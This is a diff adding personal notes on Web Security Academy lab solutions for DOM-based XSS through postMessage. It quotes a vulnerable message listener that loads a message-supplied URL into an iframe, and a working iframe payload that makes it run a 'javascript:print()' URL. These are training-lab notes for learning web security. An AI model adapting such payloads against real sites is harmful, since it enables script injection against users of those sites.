@@ -32,3 +32,35 @@ DOM XSS using web messages and a JavaScript URL
 // example payload
 <iframe src="https://0adf006c046dd455e6f30eb3006300f4.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 
+===
+
+DOM XSS using web messages and JSON.parse
+
+// target contains:
+<script>
+  window.addEventListener('message', function(e) {
+    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+    document.body.appendChild(iframe);
+    try {
+        d = JSON.parse(e.data);
+    } catch(e) {
+        return;
+    }
+    switch(d.type) {
+      case "page-load":
+        ACMEplayer.element.scrollIntoView();
+        break;
+      case "load-channel":
+        ACMEplayer.element.src = d.url;
+        break;
+      case "player-height-changed":
+        ACMEplayer.element.style.width = d.width + "px";
+        ACMEplayer.element.style.height = d.height + "px";
+        break;
+    }
+  }, false);
+</script>
+
+// example payload:
+<iframe src=https://0a5400b903f39bd7d3f2465400530044.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
